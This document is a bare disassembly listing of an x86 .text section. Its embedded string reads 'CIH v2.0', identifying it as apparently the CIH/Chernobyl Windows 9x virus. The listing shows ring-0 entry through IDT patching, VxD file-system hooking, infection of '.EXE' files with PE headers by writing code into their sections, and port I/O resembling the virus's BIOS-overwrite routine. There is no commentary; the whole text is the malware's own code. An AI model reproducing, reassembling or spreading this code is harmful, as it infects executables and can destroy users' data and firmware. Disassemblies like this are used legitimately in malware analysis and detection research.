                           .text:00401000 c3                               ret    
                           .text:00401001 00 00                            add    %al,(%eax)
                           .text:00401003 00 00                            add    %al,(%eax)
                           .text:00401005 00 00                            add    %al,(%eax)
                           .text:00401007 00 00                            add    %al,(%eax)
                           .text:00401009 00 00                            add    %al,(%eax)
                           .text:0040100b 00 cd                            add    %cl,%ch
                           .text:0040100d 03 00                            add    (%eax),%eax
                           .text:0040100f 00 55 8d                         add    %dl,-0x73(%ebp)
                           .text:00401012 44                               inc    %esp
                           .text:00401013 24 f8                            and    $0xf8,%al
                           .text:00401015 33 db                            xor    %ebx,%ebx
                           .text:00401017 64 87 03                         xchg   %eax,%fs:(%ebx)
                           .text:0040101a e8 00 00 00 00                   call   0x0040101f
                           .text:0040101f 5b                               pop    %ebx
                           .text:00401020 8d 4b 4f                         lea    0x4f(%ebx),%ecx
                           .text:00401023 90                               nop
                           .text:00401024 90                               nop
                           .text:00401025 90                               nop
                           .text:00401026 51                               push   %ecx
                           .text:00401027 50                               push   %eax
                           .text:00401028 50                               push   %eax
                           .text:00401029 0f 01 4c 24 fe                   sidtl  -0x2(%esp)
                           .text:0040102e 5b                               pop    %ebx
                           .text:0040102f 83 c3 1c                         add    $0x1c,%ebx
                           .text:00401032 fa                               cli    
                           .text:00401033 8b 2b                            mov    (%ebx),%ebp
                           .text:00401035 66 8b 6b fc                      mov    -0x4(%ebx),%bp
                           .text:00401039 8d 71 12                         lea    0x12(%ecx),%esi
                           .text:0040103c 90                               nop
                           .text:0040103d 90                               nop
                           .text:0040103e 90                               nop
                           .text:0040103f 56                               push   %esi
                           .text:00401040 66 89 73 fc                      mov    %si,-0x4(%ebx)
                           .text:00401044 c1 ee 10                         shr    $0x10,%esi
                           .text:00401047 66 89 73 02                      mov    %si,0x2(%ebx)
                           .text:0040104b 5e                               pop    %esi
                           .text:0040104c cc                               int3   
                           .text:0040104d 56                               push   %esi
                           .text:0040104e 8b f0                            mov    %eax,%esi
                           .text:00401050 8b 48 fc                         mov    -0x4(%eax),%ecx
                           .text:00401053 f3 a4                            rep movsb %ds:(%esi),%es:(%edi)
                           .text:00401055 83 e8 08                         sub    $0x8,%eax
                           .text:00401058 8b 30                            mov    (%eax),%esi
                           .text:0040105a 0b f6                            or     %esi,%esi
                           .text:0040105c 74 06                            je     0x00401064
                           .text:0040105e 90                               nop
                           .text:0040105f 90                               nop
                           .text:00401060 90                               nop
                           .text:00401061 90                               nop
                           .text:00401062 eb ec                            jmp    0x00401050
                           .text:00401064 5e                               pop    %esi
                           .text:00401065 cc                               int3   
                           .text:00401066 fb                               sti    
                           .text:00401067 33 db                            xor    %ebx,%ebx
                           .text:00401069 eb 0a                            jmp    0x00401075
                           .text:0040106b 90                               nop
                           .text:0040106c 90                               nop
                           .text:0040106d 90                               nop
                           .text:0040106e 33 db                            xor    %ebx,%ebx
                           .text:00401070 64 8b 03                         mov    %fs:(%ebx),%eax
                           .text:00401073 8b 20                            mov    (%eax),%esp
                           .text:00401075 64 8f 03                         popl   %fs:(%ebx)
                           .text:00401078 58                               pop    %eax
                           .text:00401079 5d                               pop    %ebp
                           .text:0040107a 68 00 10 40 00                   push   $0x401000
                           .text:0040107f c3                               ret    
                           .text:00401080 74 36                            je     0x004010b8
                           .text:00401082 90                               nop
                           .text:00401083 90                               nop
                           .text:00401084 90                               nop
                           .text:00401085 90                               nop
                           .text:00401086 0f 21 c1                         mov    %db0,%ecx
                           .text:00401089 e3 10                            jecxz  0x0040109b
                           .text:0040108b 83 04 24 19                      addl   $0x19,(%esp)
                           .text:0040108f 66 89 6b fc                      mov    %bp,-0x4(%ebx)
                           .text:00401093 c1 ed 10                         shr    $0x10,%ebp
                           .text:00401096 66 89 6b 02                      mov    %bp,0x2(%ebx)
                           .text:0040109a cf                               iret   
                           .text:0040109b 0f 23 c3                         mov    %ebx,%db0
                           .text:0040109e 6a 0f                            push   $0xf
                           .text:004010a0 51                               push   %ecx
                           .text:004010a1 6a ff                            push   $0xffffffff
                           .text:004010a3 51                               push   %ecx
                           .text:004010a4 51                               push   %ecx
                           .text:004010a5 51                               push   %ecx
                           .text:004010a6 6a 01                            push   $0x1
                           .text:004010a8 6a 02                            push   $0x2
                           .text:004010aa cd 20                            int    $0x20
                           .text:004010ac 53                               push   %ebx
                           .text:004010ad 00 01                            add    %al,(%ecx)
                           .text:004010af 00 83 c4 20 97 8d                add    %al,-0x7268df3c(%ebx)
                           .text:004010b5 46                               inc    %esi
                           .text:004010b6 90                               nop
                           .text:004010b7 cf                               iret   
                           .text:004010b8 8d 87 35 fd ff ff                lea    -0x2cb(%edi),%eax
                           .text:004010be 50                               push   %eax
                           .text:004010bf cd 20                            int    $0x20
                           .text:004010c1 67 00 40 00                      add    %al,0x0(%bx,%si)
                           .text:004010c5 0f 23 c0                         mov    %eax,%db0
                           .text:004010c8 58                               pop    %eax
                           .text:004010c9 8b 4e 41                         mov    0x41(%esi),%ecx
                           .text:004010cc 8b 11                            mov    (%ecx),%edx
                           .text:004010ce 89 50 fc                         mov    %edx,-0x4(%eax)
                           .text:004010d1 90                               nop
                           .text:004010d2 90                               nop
                           .text:004010d3 90                               nop
                           .text:004010d4 8d 40 cd                         lea    -0x33(%eax),%eax
                           .text:004010d7 90                               nop
                           .text:004010d8 90                               nop
                           .text:004010d9 90                               nop
                           .text:004010da 89 01                            mov    %eax,(%ecx)
                           .text:004010dc fa                               cli    
                           .text:004010dd eb b0                            jmp    0x0040108f
                           .text:004010df 53                               push   %ebx
                           .text:004010e0 e8 00 00 00 00                   call   0x004010e5
                           .text:004010e5 5b                               pop    %ebx
                           .text:004010e6 83 c3 2d                         add    $0x2d,%ebx
                           .text:004010e9 90                               nop
                           .text:004010ea 90                               nop
                           .text:004010eb 90                               nop
                           .text:004010ec 53                               push   %ebx
                           .text:004010ed cd 20                            int    $0x20
                           .text:004010ef 68 00 40 00 58                   push   $0x58004000
                           .text:004010f4 ff 74 24 08                      pushl  0x8(%esp)
                           .text:004010f8 ff 53 fc                         call   *-0x4(%ebx)
                           .text:004010fb 90                               nop
                           .text:004010fc 90                               nop
                           .text:004010fd 90                               nop
                           .text:004010fe 59                               pop    %ecx
                           .text:004010ff 50                               push   %eax
                           .text:00401100 53                               push   %ebx
                           .text:00401101 ff 53 fc                         call   *-0x4(%ebx)
                           .text:00401104 90                               nop
                           .text:00401105 90                               nop
                           .text:00401106 90                               nop
                           .text:00401107 59                               pop    %ecx
                           .text:00401108 0f 23 c0                         mov    %eax,%db0
                           .text:0040110b 58                               pop    %eax
                           .text:0040110c 5b                               pop    %ebx
                           .text:0040110d c3                               ret    
                           .text:0040110e 00 00                            add    %al,(%eax)
                           .text:00401110 00 00                            add    %al,(%eax)
                           .text:00401112 60                               pusha  
                           .text:00401113 e8 00 00 00 00                   call   0x00401118
                           .text:00401118 5e                               pop    %esi
                           .text:00401119 81 c6 c5 02 00 00                add    $0x2c5,%esi
                           .text:0040111f f6 06 01                         testb  $0x1,(%esi)
                           .text:00401122 90                               nop
                           .text:00401123 90                               nop
                           .text:00401124 90                               nop
                           .text:00401125 90                               nop
                           .text:00401126 0f 85 5e 02 00 00                jne    0x0040138a
                           .text:0040112c 8d 5c 24 28                      lea    0x28(%esp),%ebx
                           .text:00401130 83 3b 24                         cmpl   $0x24,(%ebx)
                           .text:00401133 0f 85 4b 02 00 00                jne    0x00401384
                           .text:00401139 fe 06                            incb   (%esi)
                           .text:0040113b 90                               nop
                           .text:0040113c 90                               nop
                           .text:0040113d 90                               nop
                           .text:0040113e 90                               nop
                           .text:0040113f 83 c6 05                         add    $0x5,%esi
                           .text:00401142 90                               nop
                           .text:00401143 90                               nop
                           .text:00401144 90                               nop
                           .text:00401145 56                               push   %esi
                           .text:00401146 8a 43 04                         mov    0x4(%ebx),%al
                           .text:00401149 3c ff                            cmp    $0xff,%al
                           .text:0040114b 74 0c                            je     0x00401159
                           .text:0040114d 90                               nop
                           .text:0040114e 90                               nop
                           .text:0040114f 90                               nop
                           .text:00401150 90                               nop
                           .text:00401151 04 40                            add    $0x40,%al
                           .text:00401153 b4 3a                            mov    $0x3a,%ah
                           .text:00401155 89 06                            mov    %eax,(%esi)
                           .text:00401157 46                               inc    %esi
                           .text:00401158 46                               inc    %esi
                           .text:00401159 6a 00                            push   $0x0
                           .text:0040115b 6a 7f                            push   $0x7f
                           .text:0040115d 8b 5b 10                         mov    0x10(%ebx),%ebx
                           .text:00401160 8b 43 0c                         mov    0xc(%ebx),%eax
                           .text:00401163 83 c0 04                         add    $0x4,%eax
                           .text:00401166 50                               push   %eax
                           .text:00401167 56                               push   %esi
                           .text:00401168 cd 20                            int    $0x20
                           .text:0040116a 41                               inc    %ecx
                           .text:0040116b 00 40 00                         add    %al,0x0(%eax)
                           .text:0040116e 83 c4 10                         add    $0x10,%esp
                           .text:00401171 81 7c 06 fc 2e 45 58 45          cmpl   $0x4558452e,-0x4(%esi,%eax,1)
                           .text:00401179 5e                               pop    %esi
                           .text:0040117a 0f 85 fe 01 00 00                jne    0x0040137e
                           .text:00401180 66 83 7b 18 01                   cmpw   $0x1,0x18(%ebx)
                           .text:00401185 0f 85 f3 01 00 00                jne    0x0040137e
                           .text:0040118b 66 b8 00 43                      mov    $0x4300,%ax
                           .text:0040118f cd 20                            int    $0x20
                           .text:00401191 32 00                            xor    (%eax),%al
                           .text:00401193 40                               inc    %eax
                           .text:00401194 00 0f                            add    %cl,(%edi)
                           .text:00401196 82                               (bad)  
                           .text:00401197 e3 01                            jecxz  0x0040119a
                           .text:00401199 00 00                            add    %al,(%eax)
                           .text:0040119b 51                               push   %ecx
                           .text:0040119c 8b be af fd ff ff                mov    -0x251(%esi),%edi
                           .text:004011a2 8b 3f                            mov    (%edi),%edi
                           .text:004011a4 f6 c1 01                         test   $0x1,%cl
                           .text:004011a7 74 0c                            je     0x004011b5
                           .text:004011a9 90                               nop
                           .text:004011aa 90                               nop
                           .text:004011ab 90                               nop
                           .text:004011ac 90                               nop
                           .text:004011ad 66 b8 01 43                      mov    $0x4301,%ax
                           .text:004011b1 33 c9                            xor    %ecx,%ecx
                           .text:004011b3 ff d7                            call   *%edi
                           .text:004011b5 33 c0                            xor    %eax,%eax
                           .text:004011b7 b4 d5                            mov    $0xd5,%ah
                           .text:004011b9 33 c9                            xor    %ecx,%ecx
                           .text:004011bb 33 d2                            xor    %edx,%edx
                           .text:004011bd 42                               inc    %edx
                           .text:004011be 8b da                            mov    %edx,%ebx
                           .text:004011c0 43                               inc    %ebx
                           .text:004011c1 ff d7                            call   *%edi
                           .text:004011c3 93                               xchg   %eax,%ebx
                           .text:004011c4 59                               pop    %ecx
                           .text:004011c5 9c                               pushf  
                           .text:004011c6 f6 c1 01                         test   $0x1,%cl
                           .text:004011c9 74 0a                            je     0x004011d5
                           .text:004011cb 90                               nop
                           .text:004011cc 90                               nop
                           .text:004011cd 90                               nop
                           .text:004011ce 90                               nop
                           .text:004011cf 66 b8 01 43                      mov    $0x4301,%ax
                           .text:004011d3 ff d7                            call   *%edi
                           .text:004011d5 9d                               popf   
                           .text:004011d6 0f 82 a2 01 00 00                jb     0x0040137e
                           .text:004011dc 56                               push   %esi
                           .text:004011dd 9c                               pushf  
                           .text:004011de 83 c6 7f                         add    $0x7f,%esi
                           .text:004011e1 90                               nop
                           .text:004011e2 90                               nop
                           .text:004011e3 90                               nop
                           .text:004011e4 33 c0                            xor    %eax,%eax
                           .text:004011e6 b4 d6                            mov    $0xd6,%ah
                           .text:004011e8 8b e8                            mov    %eax,%ebp
                           .text:004011ea 33 c9                            xor    %ecx,%ecx
                           .text:004011ec b1 04                            mov    $0x4,%cl
                           .text:004011ee 33 d2                            xor    %edx,%edx
                           .text:004011f0 b2 3c                            mov    $0x3c,%dl
                           .text:004011f2 ff d7                            call   *%edi
                           .text:004011f4 8b 16                            mov    (%esi),%edx
                           .text:004011f6 4a                               dec    %edx
                           .text:004011f7 8b c5                            mov    %ebp,%eax
                           .text:004011f9 ff d7                            call   *%edi
                           .text:004011fb 81 3e 00 50 45 00                cmpl   $0x455000,(%esi)
                           .text:00401201 0f 85 69 01 00 00                jne    0x00401370
                           .text:00401207 53                               push   %ebx
                           .text:00401208 6a 00                            push   $0x0
                           .text:0040120a 6a 01                            push   $0x1
                           .text:0040120c 52                               push   %edx
                           .text:0040120d 57                               push   %edi
                           .text:0040120e 0f 23 cc                         mov    %esp,%db1
                           .text:00401211 50                               push   %eax
                           .text:00401212 8b c5                            mov    %ebp,%eax
                           .text:00401214 b1 52                            mov    $0x52,%cl
                           .text:00401216 90                               nop
                           .text:00401217 90                               nop
                           .text:00401218 90                               nop
                           .text:00401219 90                               nop
                           .text:0040121a 83 c2 07                         add    $0x7,%edx
                           .text:0040121d ff d7                            call   *%edi
                           .text:0040121f 8d 42 22                         lea    0x22(%edx),%eax
                           .text:00401222 90                               nop
                           .text:00401223 90                               nop
                           .text:00401224 90                               nop
                           .text:00401225 50                               push   %eax
                           .text:00401226 8d 06                            lea    (%esi),%eax
                           .text:00401228 90                               nop
                           .text:00401229 90                               nop
                           .text:0040122a 90                               nop
                           .text:0040122b 90                               nop
                           .text:0040122c 50                               push   %eax
                           .text:0040122d 0f b7 46 0e                      movzwl 0xe(%esi),%eax
                           .text:00401231 90                               nop
                           .text:00401232 90                               nop
                           .text:00401233 90                               nop
                           .text:00401234 8d 54 10 12                      lea    0x12(%eax,%edx,1),%edx
                           .text:00401238 b0 28                            mov    $0x28,%al
                           .text:0040123a 90                               nop
                           .text:0040123b 90                               nop
                           .text:0040123c 90                               nop
                           .text:0040123d 8a 0e                            mov    (%esi),%cl
                           .text:0040123f 90                               nop
                           .text:00401240 90                               nop
                           .text:00401241 90                               nop
                           .text:00401242 90                               nop
                           .text:00401243 f6 e1                            mul    %cl
                           .text:00401245 8d 76 32                         lea    0x32(%esi),%esi
                           .text:00401248 90                               nop
                           .text:00401249 90                               nop
                           .text:0040124a 90                               nop
                           .text:0040124b 50                               push   %eax
                           .text:0040124c 52                               push   %edx
                           .text:0040124d 56                               push   %esi
                           .text:0040124e 41                               inc    %ecx
                           .text:0040124f 51                               push   %ecx
                           .text:00401250 c1 e1 03                         shl    $0x3,%ecx
                           .text:00401253 51                               push   %ecx
                           .text:00401254 03 c8                            add    %eax,%ecx
                           .text:00401256 03 ca                            add    %edx,%ecx
                           .text:00401258 2b 4e 1c                         sub    0x1c(%esi),%ecx
                           .text:0040125b 90                               nop
                           .text:0040125c 90                               nop
                           .text:0040125d 90                               nop
                           .text:0040125e f7 d1                            not    %ecx
                           .text:00401260 41                               inc    %ecx
                           .text:00401261 66 81 f9 cf 00                   cmp    $0xcf,%cx
                           .text:00401266 51                               push   %ecx
                           .text:00401267 91                               xchg   %eax,%ecx
                           .text:00401268 8b 46 f0                         mov    -0x10(%esi),%eax
                           .text:0040126b 90                               nop
                           .text:0040126c 90                               nop
                           .text:0040126d 90                               nop
                           .text:0040126e 03 46 fc                         add    -0x4(%esi),%eax
                           .text:00401271 90                               nop
                           .text:00401272 90                               nop
                           .text:00401273 90                               nop
                           .text:00401274 89 86 e8 fb ff ff                mov    %eax,-0x418(%esi)
                           .text:0040127a 8b c5                            mov    %ebp,%eax
                           .text:0040127c ff d7                            call   *%edi
                           .text:0040127e 5b                               pop    %ebx
                           .text:0040127f 5f                               pop    %edi
                           .text:00401280 59                               pop    %ecx
                           .text:00401281 57                               push   %edi
                           .text:00401282 03 d0                            add    %eax,%edx
                           .text:00401284 52                               push   %edx
                           .text:00401285 03 c6                            add    %esi,%eax
                           .text:00401287 81 78 dc 7a 69 70 5f             cmpl   $0x5f70697a,-0x24(%eax)
                           .text:0040128e 90                               nop
                           .text:0040128f 90                               nop
                           .text:00401290 90                               nop
                           .text:00401291 0f 84 87 00 00 00                je     0x0040131e
                           .text:00401297 50                               push   %eax
                           .text:00401298 8d 44 38 fc                      lea    -0x4(%eax,%edi,1),%eax
                           .text:0040129c 89 18                            mov    %ebx,(%eax)
                           .text:0040129e 53                               push   %ebx
                           .text:0040129f 03 d7                            add    %edi,%edx
                           .text:004012a1 52                               push   %edx
                           .text:004012a2 8d be 7d fb ff ff                lea    -0x483(%esi),%edi
                           .text:004012a8 57                               push   %edi
                           .text:004012a9 89 56 ce                         mov    %edx,-0x32(%esi)
                           .text:004012ac 90                               nop
                           .text:004012ad 90                               nop
                           .text:004012ae 90                               nop
                           .text:004012af 8d 56 d8                         lea    -0x28(%esi),%edx
                           .text:004012b2 90                               nop
                           .text:004012b3 90                               nop
                           .text:004012b4 90                               nop
                           .text:004012b5 bd cd 03 00 00                   mov    $0x3cd,%ebp
                           .text:004012ba eb 56                            jmp    0x00401312
                           .text:004012bc 90                               nop
                           .text:004012bd 90                               nop
                           .text:004012be 90                               nop
                           .text:004012bf 83 c2 28                         add    $0x28,%edx
                           .text:004012c2 90                               nop
                           .text:004012c3 90                               nop
                           .text:004012c4 90                               nop
                           .text:004012c5 8b 5a 10                         mov    0x10(%edx),%ebx
                           .text:004012c8 90                               nop
                           .text:004012c9 90                               nop
                           .text:004012ca 90                               nop
                           .text:004012cb 2b 5a 08                         sub    0x8(%edx),%ebx
                           .text:004012ce 90                               nop
                           .text:004012cf 90                               nop
                           .text:004012d0 90                               nop
                           .text:004012d1 76 49                            jbe    0x0040131c
                           .text:004012d3 90                               nop
                           .text:004012d4 90                               nop
                           .text:004012d5 90                               nop
                           .text:004012d6 90                               nop
                           .text:004012d7 53                               push   %ebx
                           .text:004012d8 83 e8 08                         sub    $0x8,%eax
                           .text:004012db 89 18                            mov    %ebx,(%eax)
                           .text:004012dd 8b 5a 14                         mov    0x14(%edx),%ebx
                           .text:004012e0 90                               nop
                           .text:004012e1 90                               nop
                           .text:004012e2 90                               nop
                           .text:004012e3 03 5a 08                         add    0x8(%edx),%ebx
                           .text:004012e6 90                               nop
                           .text:004012e7 90                               nop
                           .text:004012e8 90                               nop
                           .text:004012e9 53                               push   %ebx
                           .text:004012ea 57                               push   %edi
                           .text:004012eb 8b 5a 08                         mov    0x8(%edx),%ebx
                           .text:004012ee 90                               nop
                           .text:004012ef 90                               nop
                           .text:004012f0 90                               nop
                           .text:004012f1 03 5a 0c                         add    0xc(%edx),%ebx
                           .text:004012f4 90                               nop
                           .text:004012f5 90                               nop
                           .text:004012f6 90                               nop
                           .text:004012f7 03 5e fc                         add    -0x4(%esi),%ebx
                           .text:004012fa 90                               nop
                           .text:004012fb 90                               nop
                           .text:004012fc 90                               nop
                           .text:004012fd 89 58 04                         mov    %ebx,0x4(%eax)
                           .text:00401300 8b 18                            mov    (%eax),%ebx
                           .text:00401302 01 5a 08                         add    %ebx,0x8(%edx)
                           .text:00401305 90                               nop
                           .text:00401306 90                               nop
                           .text:00401307 90                               nop
                           .text:00401308 81 4a 24 40 00 00 40             orl    $0x40000040,0x24(%edx)
                           .text:0040130f 90                               nop
                           .text:00401310 90                               nop
                           .text:00401311 90                               nop
                           .text:00401312 2b eb                            sub    %ebx,%ebp
                           .text:00401314 76 10                            jbe    0x00401326
                           .text:00401316 90                               nop
                           .text:00401317 90                               nop
                           .text:00401318 90                               nop
                           .text:00401319 90                               nop
                           .text:0040131a 03 fb                            add    %ebx,%edi
                           .text:0040131c e2 a1                            loop   0x004012bf
                           .text:0040131e 0f 21 cc                         mov    %db1,%esp
                           .text:00401321 eb 35                            jmp    0x00401358
                           .text:00401323 90                               nop
                           .text:00401324 90                               nop
                           .text:00401325 90                               nop
                           .text:00401326 01 28                            add    %ebp,(%eax)
                           .text:00401328 01 6c 24 08                      add    %ebp,0x8(%esp)
                           .text:0040132c 33 db                            xor    %ebx,%ebx
                           .text:0040132e 89 58 fc                         mov    %ebx,-0x4(%eax)
                           .text:00401331 8d 86 fc fc ff ff                lea    -0x304(%esi),%eax
                           .text:00401337 b1 04                            mov    $0x4,%cl
                           .text:00401339 90                               nop
                           .text:0040133a 90                               nop
                           .text:0040133b 90                               nop
                           .text:0040133c 90                               nop
                           .text:0040133d 66 c7 00 cd 20                   movw   $0x20cd,(%eax)
                           .text:00401342 8b 94 8e 2e ff ff ff             mov    -0xd2(%esi,%ecx,4),%edx
                           .text:00401349 89 50 02                         mov    %edx,0x2(%eax)
                           .text:0040134c 0f b6 94 31 2d ff ff ff          movzbl -0xd3(%ecx,%esi,1),%edx
                           .text:00401354 2b c2                            sub    %edx,%eax
                           .text:00401356 e2 e5                            loop   0x0040133d
                           .text:00401358 0f 21 c8                         mov    %db1,%eax
                           .text:0040135b 8b 58 10                         mov    0x10(%eax),%ebx
                           .text:0040135e 8b 38                            mov    (%eax),%edi
                           .text:00401360 59                               pop    %ecx
                           .text:00401361 e3 13                            jecxz  0x00401376
                           .text:00401363 8b f1                            mov    %ecx,%esi
                           .text:00401365 b8 01 d6 00 00                   mov    $0xd601,%eax
                           .text:0040136a 5a                               pop    %edx
                           .text:0040136b 59                               pop    %ecx
                           .text:0040136c ff d7                            call   *%edi
                           .text:0040136e eb f0                            jmp    0x00401360
                           .text:00401370 33 c0                            xor    %eax,%eax
                           .text:00401372 b4 d7                            mov    $0xd7,%ah
                           .text:00401374 ff d7                            call   *%edi
                           .text:00401376 9d                               popf   
                           .text:00401377 5e                               pop    %esi
                           .text:00401378 73 28                            jae    0x004013a2
                           .text:0040137a 90                               nop
                           .text:0040137b 90                               nop
                           .text:0040137c 90                               nop
                           .text:0040137d 90                               nop
                           .text:0040137e fe 4e fb                         decb   -0x5(%esi)
                           .text:00401381 90                               nop
                           .text:00401382 90                               nop
                           .text:00401383 90                               nop
                           .text:00401384 61                               popa   
                           .text:00401385 0f 21 c0                         mov    %db0,%eax
                           .text:00401388 ff 20                            jmp    *(%eax)
                           .text:0040138a 8b dc                            mov    %esp,%ebx
                           .text:0040138c ff 73 38                         pushl  0x38(%ebx)
                           .text:0040138f ff 53 24                         call   *0x24(%ebx)
                           .text:00401392 59                               pop    %ecx
                           .text:00401393 89 43 1c                         mov    %eax,0x1c(%ebx)
                           .text:00401396 83 7b 28 24                      cmpl   $0x24,0x28(%ebx)
                           .text:0040139a 75 04                            jne    0x004013a0
                           .text:0040139c 90                               nop
                           .text:0040139d 90                               nop
                           .text:0040139e 90                               nop
                           .text:0040139f 90                               nop
                           .text:004013a0 61                               popa   
                           .text:004013a1 c3                               ret    
                           .text:004013a2 88 08                            mov    %cl,(%eax)
                           .text:004013a4 88 01                            mov    %al,(%ecx)
                           .text:004013a6 c6 00 80                         movb   $0x80,(%eax)
                           .text:004013a9 88 08                            mov    %cl,(%eax)
                           .text:004013ab 88 01                            mov    %al,(%ecx)
                           .text:004013ad c3                               ret    
                           .text:004013ae 97                               xchg   %eax,%edi
                           .text:004013af 87 d5                            xchg   %edx,%ebp
                           .text:004013b1 ef                               out    %eax,(%dx)
                           .text:004013b2 97                               xchg   %eax,%edi
                           .text:004013b3 87 d5                            xchg   %edx,%ebp
                           .text:004013b5 ec                               in     (%dx),%al
                           .text:004013b6 0c 44                            or     $0x44,%al
                           .text:004013b8 97                               xchg   %eax,%edi
                           .text:004013b9 87 d5                            xchg   %edx,%ebp
                           .text:004013bb ef                               out    %eax,(%dx)
                           .text:004013bc 97                               xchg   %eax,%edi
                           .text:004013bd 87 d5                            xchg   %edx,%ebp
                           .text:004013bf ee                               out    %al,(%dx)
                           .text:004013c0 c3                               ret    
                           .text:004013c1 00 43 7b                         add    %al,0x7b(%ebx)
                           .text:004013c4 27                               daa    
                           .text:004013c5 53                               push   %ebx
                           .text:004013c6 00 01                            add    %al,(%ecx)
                           .text:004013c8 00 68 00                         add    %ch,0x0(%eax)
                           .text:004013cb 40                               inc    %eax
                           .text:004013cc 00 41 00                         add    %al,0x0(%ecx)
                           .text:004013cf 40                               inc    %eax
                           .text:004013d0 00 32                            add    %dh,(%edx)
                           .text:004013d2 00 40 00                         add    %al,0x0(%eax)
                           .text:004013d5 43                               inc    %ebx
                           .text:004013d6 49                               dec    %ecx
                           .text:004013d7 48                               dec    %eax
                           .text:004013d8 20 76 32                         and    %dh,0x32(%esi)
                           .text:004013db 2e 30 00                         xor    %al,%cs:(%eax)
                           .text:004013de 00 00                            add    %al,(%eax)
                           .text:004013e0 00 00                            add    %al,(%eax)
                           .text:004013e2 00 00                            add    %al,(%eax)
                           .text:004013e4 00 00                            add    %al,(%eax)
                           .text:004013e6 00 00                            add    %al,(%eax)
                           .text:004013e8 00 00                            add    %al,(%eax)
                           .text:004013ea 00 00                            add    %al,(%eax)
                           .text:004013ec 00 00                            add    %al,(%eax)
                           .text:004013ee 00 00                            add    %al,(%eax)
                           .text:004013f0 00 00                            add    %al,(%eax)
                           .text:004013f2 00 00                            add    %al,(%eax)
                           .text:004013f4 00 00                            add    %al,(%eax)
                           .text:004013f6 00 00                            add    %al,(%eax)
                           .text:004013f8 00 00                            add    %al,(%eax)
                           .text:004013fa 00 00                            add    %al,(%eax)
                           .text:004013fc 00 00                            add    %al,(%eax)
                           .text:004013fe 00 00                            add    %al,(%eax)
                           .text:00401400 00 00                            add    %al,(%eax)
                           .text:00401402 00 00                            add    %al,(%eax)
                           .text:00401404 00 00                            add    %al,(%eax)
                           .text:00401406 00 00                            add    %al,(%eax)
                           .text:00401408 00 00                            add    %al,(%eax)
                           .text:0040140a 00 00                            add    %al,(%eax)
                           .text:0040140c 00 00                            add    %al,(%eax)
                           .text:0040140e 00 00                            add    %al,(%eax)
                           .text:00401410 00 00                            add    %al,(%eax)
                           .text:00401412 00 00                            add    %al,(%eax)
                           .text:00401414 00 00                            add    %al,(%eax)
                           .text:00401416 00 00                            add    %al,(%eax)
                           .text:00401418 00 00                            add    %al,(%eax)
                           .text:0040141a 00 00                            add    %al,(%eax)
                           .text:0040141c 00 00                            add    %al,(%eax)
                           .text:0040141e 00 00                            add    %al,(%eax)
                           .text:00401420 00 00                            add    %al,(%eax)
                           .text:00401422 00 00                            add    %al,(%eax)
                           .text:00401424 00 00                            add    %al,(%eax)
                           .text:00401426 00 00                            add    %al,(%eax)
                           .text:00401428 00 00                            add    %al,(%eax)
                           .text:0040142a 00 00                            add    %al,(%eax)
                           .text:0040142c 00 00                            add    %al,(%eax)
                           .text:0040142e 00 00                            add    %al,(%eax)
                           .text:00401430 00 00                            add    %al,(%eax)
                           .text:00401432 00 00                            add    %al,(%eax)
                           .text:00401434 00 00                            add    %al,(%eax)
                           .text:00401436 00 00                            add    %al,(%eax)
                           .text:00401438 00 00                            add    %al,(%eax)
                           .text:0040143a 00 00                            add    %al,(%eax)
                           .text:0040143c 00 00                            add    %al,(%eax)
                           .text:0040143e 00 00                            add    %al,(%eax)
                           .text:00401440 00 00                            add    %al,(%eax)
                           .text:00401442 00 00                            add    %al,(%eax)
                           .text:00401444 00 00                            add    %al,(%eax)
                           .text:00401446 00 00                            add    %al,(%eax)
                           .text:00401448 00 00                            add    %al,(%eax)
                           .text:0040144a 00 00                            add    %al,(%eax)
                           .text:0040144c 00 00                            add    %al,(%eax)
                           .text:0040144e 00 00                            add    %al,(%eax)
                           .text:00401450 00 00                            add    %al,(%eax)
                           .text:00401452 00 00                            add    %al,(%eax)
                           .text:00401454 00 00                            add    %al,(%eax)
                           .text:00401456 00 00                            add    %al,(%eax)
                           .text:00401458 00 00                            add    %al,(%eax)
                           .text:0040145a 00 00                            add    %al,(%eax)
                           .text:0040145c 00 00                            add    %al,(%eax)
                           .text:0040145e 00 00                            add    %al,(%eax)
                           .text:00401460 00 00                            add    %al,(%eax)
                           .text:00401462 00 00                            add    %al,(%eax)
                           .text:00401464 00 00                            add    %al,(%eax)
                           .text:00401466 00 00                            add    %al,(%eax)
                           .text:00401468 00 00                            add    %al,(%eax)
                           .text:0040146a 00 00                            add    %al,(%eax)
                           .text:0040146c 00 00                            add    %al,(%eax)
                           .text:0040146e 00 00                            add    %al,(%eax)
                           .text:00401470 00 00                            add    %al,(%eax)
                           .text:00401472 00 00                            add    %al,(%eax)
                           .text:00401474 00 00                            add    %al,(%eax)
                           .text:00401476 00 00                            add    %al,(%eax)
                           .text:00401478 00 00                            add    %al,(%eax)
                           .text:0040147a 00 00                            add    %al,(%eax)
                           .text:0040147c 00 00                            add    %al,(%eax)
                           .text:0040147e 00 00                            add    %al,(%eax)
                           .text:00401480 00 00                            add    %al,(%eax)
                           .text:00401482 00 00                            add    %al,(%eax)
                           .text:00401484 00 00                            add    %al,(%eax)
                           .text:00401486 00 00                            add    %al,(%eax)
                           .text:00401488 00 00                            add    %al,(%eax)
                           .text:0040148a 00 00                            add    %al,(%eax)
                           .text:0040148c 00 00                            add    %al,(%eax)
                           .text:0040148e 00 00                            add    %al,(%eax)
                           .text:00401490 00 00                            add    %al,(%eax)
                           .text:00401492 00 00                            add    %al,(%eax)
                           .text:00401494 00 00                            add    %al,(%eax)
                           .text:00401496 00 00                            add    %al,(%eax)
                           .text:00401498 00 00                            add    %al,(%eax)
                           .text:0040149a 00 00                            add    %al,(%eax)
                           .text:0040149c 00 00                            add    %al,(%eax)
                           .text:0040149e 00 00                            add    %al,(%eax)
                           .text:004014a0 00 00                            add    %al,(%eax)
                           .text:004014a2 00 00                            add    %al,(%eax)
                           .text:004014a4 00 00                            add    %al,(%eax)
                           .text:004014a6 00 00                            add    %al,(%eax)
                           .text:004014a8 00 00                            add    %al,(%eax)
                           .text:004014aa 00 00                            add    %al,(%eax)
                           .text:004014ac 00 00                            add    %al,(%eax)
                           .text:004014ae 00 00                            add    %al,(%eax)
                           .text:004014b0 00 00                            add    %al,(%eax)
                           .text:004014b2 00 00                            add    %al,(%eax)
                           .text:004014b4 00 00                            add    %al,(%eax)
                           .text:004014b6 00 00                            add    %al,(%eax)
                           .text:004014b8 00 00                            add    %al,(%eax)
                           .text:004014ba 00 00                            add    %al,(%eax)
                           .text:004014bc 00 00                            add    %al,(%eax)
